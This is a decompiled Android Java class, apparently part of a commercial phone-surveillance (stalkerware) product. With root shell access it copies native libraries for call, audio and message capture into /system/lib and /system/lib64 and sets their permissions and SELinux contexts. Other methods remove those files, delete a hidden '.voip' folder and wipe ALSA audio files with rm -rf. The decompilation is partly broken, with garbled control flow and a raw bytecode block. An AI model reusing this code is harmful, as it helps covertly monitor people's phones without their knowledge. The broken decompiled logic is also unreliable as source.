package com.vvt.r;

import android.content.Context;
import android.content.res.AssetManager;
import com.fx.daemon.b;
import com.vvt.io.d;
import com.vvt.io.p;
import com.vvt.shell.ShellUtil;
import com.vvt.shell.f;
import java.io.File;
import java.util.Collections;
import java.util.HashSet;
import java.util.Iterator;
import java.util.Set;

public class a
{
  public static final Set a;
  public static final Set b;
  private static final boolean c = com.vvt.ak.a.b;
  private static final boolean d = com.vvt.ak.a.e;
  
  static
  {
    HashSet localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    localHashSet.add("libfxexec.so");
    localHashSet.add("libfxril.so");
    localHashSet.add("libflsonyconfig.so");
    localHashSet.add("libflsamsungconfig.so");
    localHashSet.add("libflhtcconfig.so");
    localHashSet.add("libfllgconfig.so");
    localHashSet.add("libflmotoconfig.so");
    localHashSet.add("libflasusconfig.so");
    localHashSet.add("libkma.so");
    localHashSet.add("libkmb.so");
    localHashSet.add("libaac.so");
    localHashSet.add("libamr.so");
    localHashSet.add("liblame.so");
    localHashSet.add("libasound.so");
    localHashSet.add("libmp3lame.so");
    localHashSet.add("libfxwebp.so");
    localHashSet.add("libfxtmessages.8.so");
    localHashSet.add("libsqliteX.so");
    localHashSet.add("libvcap.so");
    a = Collections.unmodifiableSet(localHashSet);
    localHashSet = new java/util/HashSet;
    localHashSet.<init>();
    localHashSet.add("libflsonyconfig.so");
    localHashSet.add("libflsamsungconfig.so");
    localHashSet.add("libflhtcconfig.so");
    localHashSet.add("libfllgconfig.so");
    localHashSet.add("libflmotoconfig.so");
    localHashSet.add("libflasusconfig.so");
    localHashSet.add("libfxexec.so");
    localHashSet.add("libfxril.so");
    localHashSet.add("libmp3lame.so");
    localHashSet.add("libfxwebp.so");
    localHashSet.add("libfxtmessages.8.so");
    localHashSet.add("libsqliteX.so");
    localHashSet.add("libaac.so");
    localHashSet.add("libamr.so");
    localHashSet.add("liblame.so");
    localHashSet.add("libasound.so");
    b = Collections.unmodifiableSet(localHashSet);
  }
  
  private static void a()
  {
    boolean bool1 = c;
    if (bool1) {}
    bool1 = false;
    localObject1 = null;
    try
    {
      localObject1 = f.b();
      String str1;
      String str2;
      int i;
      Object[] arrayOfObject;
      boolean bool2;
      if (localObject2 == null) {
        break label121;
      }
    }
    catch (Exception localException)
    {
      for (;;)
      {
        try
        {
          str1 = d.a();
          str2 = "%s/.voip";
          i = 1;
          arrayOfObject = new Object[i];
          arrayOfObject[0] = str1;
          str1 = String.format(str2, arrayOfObject);
          str2 = "rm -rf %s";
          i = 1;
          arrayOfObject = new Object[i];
          arrayOfObject[0] = str1;
          str1 = String.format(str2, arrayOfObject);
          ((f)localObject1).a(str1);
          if (localObject1 != null) {
            ((f)localObject1).d();
          }
          return;
        }
        finally
        {
          Object localObject2 = localObject1;
          localObject1 = localObject4;
          continue;
        }
        localException = localException;
        bool2 = d;
        if ((bool2) && (localObject1 == null)) {}
      }
    }
    finally
    {
      localObject3 = finally;
      bool2 = false;
      localObject2 = null;
      localObject1 = localObject3;
    }
    ((f)localObject2).d();
    label121:
    throw ((Throwable)localObject1);
  }
  
  public static void a(Context paramContext, String paramString1, f paramf, String paramString2, Set paramSet, boolean paramBoolean)
  {
    int i = c;
    if (i != 0) {}
    i = c;
    if (i != 0) {}
    i = c;
    if (i != 0) {}
    Object localObject1 = p.a(paramContext);
    i = ShellUtil.b(paramString2);
    boolean bool1;
    if (i != 0)
    {
      i = c;
      if (i != 0) {}
      String[] arrayOfString;
      for (;;)
      {
        boolean bool3;
        String str3;
        try
        {
          AssetManager localAssetManager = paramContext.getAssets();
          arrayOfString = localAssetManager.list(paramString1);
          int k = arrayOfString.length;
          i = 0;
          localAssetManager = null;
          if (i >= k) {
            break;
          }
          str2 = arrayOfString[i];
          boolean bool2 = paramSet.contains(str2);
          if (bool2)
          {
            localObject2 = new Object[2];
            localObject3 = null;
            localObject2[0] = paramString2;
            bool3 = true;
            localObject2[bool3] = str2;
            str3 = String.format("%s/%s", (Object[])localObject2);
            bool4 = c;
            if (bool4) {}
            bool4 = ShellUtil.b(str3);
            bool3 = c;
            if ((bool3) && ((!paramBoolean) || (!bool4))) {
              break label214;
            }
            boolean bool5 = c;
            if (!bool5) {}
          }
          int j;
          i += 1;
          continue;
          return;
        }
        catch (Exception localException)
        {
          bool1 = d;
          if (!bool1) {}
        }
        label214:
        if (bool4)
        {
          bool4 = c;
          if (bool4) {}
          bool3 = true;
          localObject3 = new Object[bool3];
          i1 = 0;
          localObject3[0] = str3;
          localObject2 = String.format("rm %s", (Object[])localObject3);
          paramf.a((String)localObject2);
        }
        boolean bool4 = c;
        if (bool4) {}
        int m = 2;
        Object localObject3 = new Object[m];
        localObject3[0] = localObject1;
        int i1 = 1;
        localObject3[i1] = str2;
        Object localObject2 = String.format("%s/%s", (Object[])localObject3);
        localObject3 = new java/io/File;
        ((File)localObject3).<init>((String)localObject2);
        bool4 = ((File)localObject3).exists();
        if (bool4)
        {
          bool4 = c;
          if (bool4) {}
          ((File)localObject3).delete();
        }
        localObject2 = paramContext.getAssets();
        b.a((AssetManager)localObject2, paramString1, (String)localObject1, (String)localObject1, str2);
        bool4 = c;
        if (bool4) {}
        localObject3 = new Object[3];
        localObject3[0] = localObject1;
        i1 = 1;
        localObject3[i1] = str2;
        int n = 2;
        localObject3[n] = str3;
        String str2 = String.format("cat %s/%s > %s", (Object[])localObject3);
        paramf.a(str2);
        bool4 = true;
        localObject2 = new Object[bool4];
        m = 0;
        localObject3 = null;
        localObject2[0] = str3;
        str2 = String.format("chmod 644 %s", (Object[])localObject2);
        paramf.a(str2);
      }
      bool1 = com.vvt.aa.a.c();
      if (bool1)
      {
        int i2 = 1;
        localObject1 = new Object[i2];
        arrayOfString = null;
        localObject1[0] = paramString2;
        String str1 = String.format("restorecon -RF %s", (Object[])localObject1);
        paramf.a(str1);
        bool1 = c;
        if (!bool1) {}
      }
    }
    for (;;)
    {
      bool1 = c;
      if (!bool1) {
        break;
      }
      break;
      bool1 = c;
      if (!bool1) {}
    }
  }
  
  public static void a(f paramf)
  {
    int i = 2;
    int j = 1;
    String str1 = "/system/lib";
    Object localObject = a;
    Iterator localIterator = ((Set)localObject).iterator();
    boolean bool2;
    String str2;
    Object[] arrayOfObject;
    for (;;)
    {
      bool1 = localIterator.hasNext();
      if (!bool1) {
        break;
      }
      localObject = (String)localIterator.next();
      bool2 = c;
      if (bool2) {}
      str2 = "rm %s/%s";
      arrayOfObject = new Object[i];
      arrayOfObject[0] = str1;
      arrayOfObject[j] = localObject;
      localObject = String.format(str2, arrayOfObject);
      paramf.a((String)localObject);
    }
    boolean bool1 = com.vvt.aa.a.b();
    if (bool1)
    {
      bool1 = com.vvt.aa.a.g();
      if (bool1)
      {
        str1 = "/system/lib64";
        localObject = b;
        localIterator = ((Set)localObject).iterator();
        for (;;)
        {
          bool1 = localIterator.hasNext();
          if (!bool1) {
            break;
          }
          localObject = (String)localIterator.next();
          bool2 = c;
          if (bool2) {}
          str2 = "rm %s/%s";
          arrayOfObject = new Object[i];
          arrayOfObject[0] = str1;
          arrayOfObject[j] = localObject;
          localObject = String.format(str2, arrayOfObject);
          paramf.a((String)localObject);
        }
      }
    }
  }
  
  /* Error */
  public static boolean a(String paramString, boolean paramBoolean)
  {
    // Byte code:
    //   0: iconst_1
    //   1: istore_2
    //   2: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   5: istore_3
    //   6: iload_3
    //   7: ifeq +3 -> 10
    //   10: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   13: istore_3
    //   14: iload_3
    //   15: ifeq +3 -> 18
    //   18: iconst_0
    //   19: istore_3
    //   20: aconst_null
    //   21: astore 4
    //   23: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   26: istore 5
    //   28: iload 5
    //   30: ifeq +3 -> 33
    //   33: iload_2
    //   34: invokestatic 194	com/vvt/shell/ShellUtil:a	(Z)V
    //   37: invokestatic 86	com/vvt/shell/f:removeFromPath	()Lcom/vvt/shell/f;
    //   40: astore 4
    //   42: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   45: istore 5
    //   47: iload 5
    //   49: ifeq +3 -> 52
    //   52: aload 4
    //   54: invokestatic 197	com/vvt/r/a:a	(Lcom/vvt/shell/f;)V
    //   57: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   60: istore 5
    //   62: iload 5
    //   64: ifeq +3 -> 67
    //   67: aload 4
    //   69: invokestatic 199	com/vvt/r/a:removeFromPath	(Lcom/vvt/shell/f;)V
    //   72: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   75: istore 5
    //   77: iload 5
    //   79: ifeq +3 -> 82
    //   82: invokestatic 201	com/vvt/r/a:a	()V
    //   85: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   88: istore 5
    //   90: iload 5
    //   92: ifeq +3 -> 95
    //   95: ldc -53
    //   97: astore 6
    //   99: new 205	java/lang/StringBuilder
    //   102: astore 7
    //   104: aload 7
    //   106: invokespecial 206	java/lang/StringBuilder:<init>	()V
    //   109: aload 7
    //   111: aload_0
    //   112: invokevirtual 210	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   115: astore 7
    //   117: ldc -44
    //   119: astore 8
    //   121: aload 7
    //   123: aload 8
    //   125: invokevirtual 210	java/lang/StringBuilder:append	(Ljava/lang/String;)Ljava/lang/StringBuilder;
    //   128: astore 7
    //   130: aload 7
    //   132: invokevirtual 215	java/lang/StringBuilder:toString	()Ljava/lang/String;
    //   135: astore 7
    //   137: aload 6
    //   139: aload 7
    //   141: invokestatic 218	com/vvt/io/p:a	(Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;
    //   144: astore 6
    //   146: ldc -36
    //   148: astore 7
    //   150: iconst_1
    //   151: istore 9
    //   153: iload 9
    //   155: anewarray 4	java/lang/Object
    //   158: astore 8
    //   160: aload 8
    //   162: iconst_0
    //   163: aload 6
    //   165: aastore
    //   166: aload 7
    //   168: aload 8
    //   170: invokestatic 100	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   173: astore 6
    //   175: aload 4
    //   177: aload 6
    //   179: invokevirtual 105	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   182: pop
    //   183: iload_1
    //   184: ifeq +169 -> 353
    //   187: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   190: istore 5
    //   192: iload 5
    //   194: ifeq +3 -> 197
    //   197: ldc -34
    //   199: astore 6
    //   201: iconst_1
    //   202: istore 10
    //   204: iload 10
    //   206: anewarray 4	java/lang/Object
    //   209: astore 7
    //   211: iconst_0
    //   212: istore 9
    //   214: aconst_null
    //   215: astore 8
    //   217: aload 7
    //   219: iconst_0
    //   220: aload_0
    //   221: aastore
    //   222: aload 6
    //   224: aload 7
    //   226: invokestatic 100	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   229: astore 6
    //   231: aload 4
    //   233: aload 6
    //   235: invokevirtual 105	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   238: pop
    //   239: ldc2_w 223
    //   242: lstore 11
    //   244: lload 11
    //   246: invokestatic 232	android/os/SystemClock:sleep	(J)V
    //   249: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   252: istore 5
    //   254: iload 5
    //   256: ifeq +3 -> 259
    //   259: ldc -22
    //   261: astore 6
    //   263: iconst_1
    //   264: istore 10
    //   266: iload 10
    //   268: anewarray 4	java/lang/Object
    //   271: astore 7
    //   273: iconst_0
    //   274: istore 9
    //   276: aconst_null
    //   277: astore 8
    //   279: aload 7
    //   281: iconst_0
    //   282: aload_0
    //   283: aastore
    //   284: aload 6
    //   286: aload 7
    //   288: invokestatic 100	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   291: astore 6
    //   293: aload 4
    //   295: aload 6
    //   297: invokevirtual 105	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   300: pop
    //   301: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   304: istore 5
    //   306: iload 5
    //   308: ifeq +3 -> 311
    //   311: ldc -20
    //   313: astore 6
    //   315: iconst_1
    //   316: istore 10
    //   318: iload 10
    //   320: anewarray 4	java/lang/Object
    //   323: astore 7
    //   325: iconst_0
    //   326: istore 9
    //   328: aconst_null
    //   329: astore 8
    //   331: aload 7
    //   333: iconst_0
    //   334: aload_0
    //   335: aastore
    //   336: aload 6
    //   338: aload 7
    //   340: invokestatic 100	java/lang/String:format	(Ljava/lang/String;[Ljava/lang/Object;)Ljava/lang/String;
    //   343: astore 6
    //   345: aload 4
    //   347: aload 6
    //   349: invokevirtual 105	com/vvt/shell/f:a	(Ljava/lang/String;)Ljava/lang/String;
    //   352: pop
    //   353: aload 4
    //   355: ifnull +8 -> 363
    //   358: aload 4
    //   360: invokevirtual 107	com/vvt/shell/f:d	()V
    //   363: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   366: istore_3
    //   367: iload_3
    //   368: ifeq +3 -> 371
    //   371: iconst_0
    //   372: invokestatic 194	com/vvt/shell/ShellUtil:a	(Z)V
    //   375: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   378: istore_3
    //   379: iload_3
    //   380: ifeq +3 -> 383
    //   383: iload_2
    //   384: ireturn
    //   385: astore 13
    //   387: iconst_0
    //   388: istore_2
    //   389: aconst_null
    //   390: astore 13
    //   392: getstatic 21	com/vvt/r/a:d	Z
    //   395: istore 5
    //   397: iload 5
    //   399: ifeq +3 -> 402
    //   402: aload 4
    //   404: ifnull +8 -> 412
    //   407: aload 4
    //   409: invokevirtual 107	com/vvt/shell/f:d	()V
    //   412: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   415: istore_3
    //   416: iload_3
    //   417: ifeq -46 -> 371
    //   420: goto -49 -> 371
    //   423: astore 13
    //   425: aload 4
    //   427: ifnull +8 -> 435
    //   430: aload 4
    //   432: invokevirtual 107	com/vvt/shell/f:d	()V
    //   435: getstatic 16	com/vvt/r/a:MyUncaughtExceptionHandler	Z
    //   438: istore_3
    //   439: iload_3
    //   440: ifeq +3 -> 443
    //   443: iconst_0
    //   444: invokestatic 194	com/vvt/shell/ShellUtil:a	(Z)V
    //   447: aload 13
    //   449: athrow
    //   450: astore 6
    //   452: goto -60 -> 392
    // Local variable table:
    //   start	length	slot	name	signature
    //   0	455	0	paramString	String
    //   0	455	1	paramBoolean	boolean
    //   1	388	2	bool1	boolean
    //   5	435	3	bool2	boolean
    //   21	410	4	localf	f
    //   26	372	5	bool3	boolean
    //   97	251	6	str	String
    //   450	1	6	localException1	Exception
    //   102	237	7	localObject1	Object
    //   119	211	8	localObject2	Object
    //   151	176	9	i	int
    //   202	117	10	j	int
    //   242	3	11	l	long
    //   385	1	13	localException2	Exception
    //   390	1	13	localObject3	Object
    //   423	25	13	localObject4	Object
    // Exception table:
    //   from	to	target	type
    //   37	40	385	java/lang/Exception
    //   42	45	385	java/lang/Exception
    //   52	57	385	java/lang/Exception
    //   57	60	385	java/lang/Exception
    //   67	72	385	java/lang/Exception
    //   72	75	385	java/lang/Exception
    //   82	85	385	java/lang/Exception
    //   85	88	385	java/lang/Exception
    //   99	102	385	java/lang/Exception
    //   104	109	385	java/lang/Exception
    //   111	115	385	java/lang/Exception
    //   123	128	385	java/lang/Exception
    //   130	135	385	java/lang/Exception
    //   139	144	385	java/lang/Exception
    //   153	158	385	java/lang/Exception
    //   163	166	385	java/lang/Exception
    //   168	173	385	java/lang/Exception
    //   177	183	385	java/lang/Exception
    //   37	40	423	finally
    //   42	45	423	finally
    //   52	57	423	finally
    //   57	60	423	finally
    //   67	72	423	finally
    //   72	75	423	finally
    //   82	85	423	finally
    //   85	88	423	finally
    //   99	102	423	finally
    //   104	109	423	finally
    //   111	115	423	finally
    //   123	128	423	finally
    //   130	135	423	finally
    //   139	144	423	finally
    //   153	158	423	finally
    //   163	166	423	finally
    //   168	173	423	finally
    //   177	183	423	finally
    //   187	190	423	finally
    //   204	209	423	finally
    //   220	222	423	finally
    //   224	229	423	finally
    //   233	239	423	finally
    //   244	249	423	finally
    //   249	252	423	finally
    //   266	271	423	finally
    //   282	284	423	finally
    //   286	291	423	finally
    //   295	301	423	finally
    //   301	304	423	finally
    //   318	323	423	finally
    //   334	336	423	finally
    //   338	343	423	finally
    //   347	353	423	finally
    //   392	395	423	finally
    //   187	190	450	java/lang/Exception
    //   204	209	450	java/lang/Exception
    //   220	222	450	java/lang/Exception
    //   224	229	450	java/lang/Exception
    //   233	239	450	java/lang/Exception
    //   244	249	450	java/lang/Exception
    //   249	252	450	java/lang/Exception
    //   266	271	450	java/lang/Exception
    //   282	284	450	java/lang/Exception
    //   286	291	450	java/lang/Exception
    //   295	301	450	java/lang/Exception
    //   301	304	450	java/lang/Exception
    //   318	323	450	java/lang/Exception
    //   334	336	450	java/lang/Exception
    //   338	343	450	java/lang/Exception
    //   347	353	450	java/lang/Exception
  }
  
  private static void b(f paramf)
  {
    try
    {
      bool = c;
      if (bool) {}
      String str = "rm -rf /system/usr/share/alsa;rm /system/xbin/alsa_amixer;rm /system/lib/libasound.so;rm /system/lib64/libasound.so;";
      paramf.a(str);
      return;
    }
    catch (Exception localException)
    {
      for (;;)
      {
        boolean bool = d;
        if (!bool) {}
      }
    }
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/r/a.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */